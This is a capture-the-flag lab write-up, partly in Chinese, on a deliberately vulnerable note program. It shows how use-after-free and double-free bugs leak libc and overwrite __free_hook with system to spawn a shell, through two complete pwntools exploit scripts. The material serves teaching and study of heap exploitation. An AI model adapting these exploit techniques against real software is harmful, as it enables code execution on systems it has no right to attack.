---
title: Simple PWN 0x39(Lab - Double Free)
tags: [eductf, CTF, PWN]

category: "Security/Course/NTU CS/PWN"
---

# Simple PWN 0x39(Lab - Double Free)
<!-- more -->

## Background
[0x18(Lab - `babynote`)](https://hackmd.io/@SBK6401/rkD83kaji)

## Source code
:::spoiler Source Code
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>

struct note
{
	char *content;
	unsigned long len;
};

struct note notes[0x10];

int read_int()
{
	char buf[0x20];
	read(0, buf, 0x1f);
	return atoi(buf);
}

unsigned long read_ul()
{
	char buf[0x20];
	read(0, buf, 0x1f);
	return strtoul(buf, NULL, 10);
}

int get_idx()
{
	int idx = read_int();
	if (idx >= 0x10 || idx < 1)
		exit(0);
	return idx;
}

void add_note()
{
	int idx;
	printf("Index: ");
	idx = get_idx();
	printf("Length: ");
	notes[idx].len = read_ul();
	notes[idx].content = malloc(notes[idx].len);
	puts("Add done");
}

void read_note()
{
	int idx;
	printf("Index: ");
	idx = get_idx();
	printf("Note[%d]:\n", idx);
	write(1, notes[idx].content, notes[idx].len);
}

void write_note()
{
	int idx;
	printf("Index: ");
	idx = get_idx();
	printf("Content: ");
	read(0, notes[idx].content, notes[idx].len);
}

void delete_note()
{
	int idx;
	printf("Index: ");
	idx = get_idx();
	free(notes[idx].content);
	puts("Delete done");
}

void memu()
{
	puts("1. add note");
	puts("2. read note");
	puts("3. write note");
	puts("4. delete note");
	printf("choice: ");
}

int main(void)
{
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
	int fd = open("./flag.txt", O_RDONLY);
	notes[0].len = 0x30;
	notes[0].content = malloc(0x30);
	read(fd, notes[0].content, 0x30);
	close(fd);

	for (;;)
	{
		memu();
		int choice = read_int();
		switch (choice)
		{
		case 1:
			add_note();
			break;
		case 2:
			read_note();
			break;
		case 3:
			write_note();
			break;
		case 4:
			delete_note();
			break;
		default:
			puts("Invalid command");
		}
	}
	return 0;
}
```
:::

## Recon
:::warning
Run On Ubuntu 20.04
:::
這一題有很多種方式可以拿到shell，不過原理都是一樣的，前置作業都是一樣的，也就是要利用UAF去leak出libc address，接著算出`__free_hook`以及`system`的位址，接著想辦法把`system`寫到`__free_hook`的位址，此時就有兩種方式可以寫，一種是利用此次學到的double free，把值寫到最後一個在tcache的free chunk，蓋掉他的fd，接著就可以用add_note把tcache的值要回來，並寫system的address進到__free_hook；另一種方式就比較簡單，也就是把free chunk的fd利用UAF的特性改掉，並且直接add_note把東西從tcache要回來，之後就一樣寫system_addr，後free掉一個帶有/bin/sh的chunk，此時就會開一個shell給我們了

### 前置作業: Leak Libc Address
關於這一點可以參考[如何用UAF leak libc address?](https://hackmd.io/@SBK6401/SJWc9v4Bp#%E5%A6%82%E4%BD%95%E7%94%A8UAF-leak-libc-address)，方法都一樣，首先要想辦法讓free chunk進到unsorted bin中(最簡單的方法就是設定超過0x410的空間)，接著因為malloc的時候沒有實作清空原本的資料，導致我們可以leak其中有關libc section的資訊。底下的設定意思是我們先設定三個notes，#14的意思是不要讓#13被free掉的時候被consolidate用的，接著我們把前兩個free掉，結果如下
![image](https://hackmd.io/_uploads/r14opZfL6.png)
會發現#12和#13被consolidate在一起了，接著我們看其中的一些資訊
![image](https://hackmd.io/_uploads/SJwX0-GIT.png)
裡面確實存著libc相關的資訊，接著只要把這一塊chunk malloc出去給隨便一個note，接著讀其中的資料就可以讀出libc address了
```python
add_note(12, 0x420)
add_note(13, 0x420)
add_note(14, 0x420)
del_note(12)
del_note(13)
add_note(12, 0x420)
read_note(12)

leak_libc = u64(r.recv(8))
libc_base = leak_libc - 0x1ed0e0
system_addr = libc_base + libc.symbols['system']
free_hook = libc_base + 0x1eee48
log.success(f'Leak Libc = {hex(leak_libc)}')
log.success(f'Libc Base = {hex(libc_base)}')
log.success(f'System Address = {hex(system_addr)}')
log.success(f'Free Hook = {hex(free_hook)}')
r.recv(0x420 - 0x8)
```

### 方法一: Double Fee
有了libc address後，我們要想辦法把system address寫到`__free_hook`的位置，如果是要用double free的方法的話可以參考上課的講義:
![image](https://hackmd.io/_uploads/SJNM1Mf8T.png)

最簡單的方法是，我把tcache填滿(一定要)，然後用free(a)→free(b)→free(a)的順序產生double free
```python
for i in range(1, 0xa):
    add_note(i, 0x10)

for i in range(1, 0x8):
    del_note(i)

del_note(8)
del_note(9)
del_note(8)
```
此時的heapinfo會變成:
![image](https://hackmd.io/_uploads/H1GGgGM86.png)

接著我們把tcache清空後再繼續add_note就會把fastbin的free chunk搬到tcache中
```python
add_note(8, 0x18)
```
![image](https://hackmd.io/_uploads/B1ErzMM8T.png)

接著我們寫free_hook address到note #8，這樣的話，tcache的順序就會變成下圖:
```python
write_note(8, p64(free_hook))
```
![image](https://hackmd.io/_uploads/rktIXGMIp.png)

此時我們就把free chunk變成free_hook的地址，我們只不斷的add_note，就可以把tcache的free chunk要回來進行寫入，也就是寫system address:
```python
bin_sh = u64(b'/bin/sh\x00')
add_note(9, 0x10)
write_note(9, p64(bin_sh))
add_note(10, 0x10)
add_note(11, 0x10)
write_note(11, p64(system_addr))
```
![image](https://hackmd.io/_uploads/SydnNzMIa.png)

最後的結果如上圖，會發現note #11已經變成==0x7f900aa8ae48==，這個就是`__free_hook`的位址，進去看發現已經被我們寫入system address，這個時候我們只要把含有`/bin/sh\x00`的note #9 free掉，就可以開shell了

### 方法二: 一般的寫入
這一個方法比較方便，也和double free沒關係，反正我們只要利用UAF的特性，也可以把free chunk的fd改掉，再用像前面的方法就可以開shell

下面的建構就是先開兩個note，然後free掉，此時我們就可以利用UAF的漏洞把free chunk的fd改掉，結果如下圖
![image](https://hackmd.io/_uploads/B1ohIMz86.png)
```python
add_note(1, 0x18)
add_note(2, 0x18)
del_note(2)
del_note(1)
write_note(1, p64(free_hook) + p64(0) * 2)
```

接著就把`/bin/sh\x00`寫到note #2，接著就不斷add_note，把`__free_hook`的address拿到手，然後再把system address寫到`__free_hook`，最後把含有`/bin/sh\x00`的note #2 free掉，結果如下圖:
![image](https://hackmd.io/_uploads/HkGsPGfL6.png)
從上圖得知，note #4的address已經被我們換成`__free_hook` address，並且實際跟進去就是system address，最後只要free掉note #2就可以開shell了

## Exploit - Leak Libc(UAF) + Double Free(?)
:::spoiler Method 1
```python
from pwn import *

r = process('./chal')
r = remote('10.113.184.121', 10058)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.arch = 'amd64'

def add_note(idx, len):
    r.recvuntil(b'choice: ')
    r.send(b'1')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode())
    r.recvuntil(b'Length: ')
    r.send(str(len).encode())

def read_note(idx):
    r.recvuntil(b'choice: ')
    r.send(b'2')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode())
    r.recvline()

def write_note(idx, content):
    r.recvuntil(b'choice: ')
    r.send(b'3')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode())
    r.recvuntil(b'Content: ')
    r.send(content)

def del_note(idx):
    r.recvuntil(b'choice: ')
    r.send(b'4')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode())

# Leak libc address
add_note(12, 0x420)
add_note(13, 0x420)
add_note(14, 0x420)
del_note(12)
del_note(13)
add_note(12, 0x420)
read_note(12)

leak_libc = u64(r.recv(8))
libc_base = leak_libc - 0x1ed0e0
system_addr = libc_base + libc.symbols['system']
free_hook = libc_base + 0x1eee48
log.success(f'Leak Libc = {hex(leak_libc)}')
log.success(f'Libc Base = {hex(libc_base)}')
log.success(f'System Address = {hex(system_addr)}')
log.success(f'Free Hook = {hex(free_hook)}')
r.recv(0x420 - 0x8)

## Use Double Free to Write system_addr to __free_hook
for i in range(1, 0xa):
    add_note(i, 0x10)

for i in range(1, 0x8):
    del_note(i)

del_note(8)
del_note(9)
del_note(8)

### Clean tcache
for i in range(1, 0x8):
    add_note(i, 0x10)
add_note(8, 0x18)
write_note(8, p64(free_hook))
bin_sh = u64(b'/bin/sh\x00')
add_note(9, 0x10)
write_note(9, p64(bin_sh))
add_note(10, 0x10)
add_note(11, 0x10)
write_note(11, p64(system_addr))
del_note(9)

r.interactive()
```
:::

:::spoiler Method 2
```python
from pwn import *

r = process('./chal')
r = remote('10.113.184.121', 10058)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.arch = 'amd64'

def add_note(idx, len):
    r.recvuntil(b'choice: ')
    r.send(b'1')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode())
    r.recvuntil(b'Length: ')
    r.send(str(len).encode())

def read_note(idx):
    r.recvuntil(b'choice: ')
    r.send(b'2')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode())
    r.recvline()

def write_note(idx, content):
    r.recvuntil(b'choice: ')
    r.send(b'3')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode())
    r.recvuntil(b'Content: ')
    r.send(content)

def del_note(idx):
    r.recvuntil(b'choice: ')
    r.send(b'4')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode())

# Leak libc address
add_note(12, 0x420)
add_note(13, 0x420)
add_note(14, 0x420)
del_note(12)
del_note(13)
add_note(12, 0x420)
read_note(12)

leak_libc = u64(r.recv(8))
libc_base = leak_libc - 0x1ed0e0
system_addr = libc_base + libc.symbols['system']
free_hook = libc_base + 0x1eee48
log.success(f'Leak Libc = {hex(leak_libc)}')
log.success(f'Libc Base = {hex(libc_base)}')
log.success(f'System Address = {hex(system_addr)}')
log.success(f'Free Hook = {hex(free_hook)}')
r.recv(0x420 - 0x8)

## Another Way to Write system_addr to __free_hook
add_note(1, 0x18)
add_note(2, 0x18)
del_note(2)
del_note(1)
write_note(1, p64(free_hook) + p64(0) * 2)
bin_sh = u64(b'/bin/sh\x00')
write_note(2, p64(bin_sh))
add_note(3, 0x18)
add_note(4, 0x18)
write_note(4, p64(system_addr))
raw_input()
del_note(2)

r.interactive()
```
:::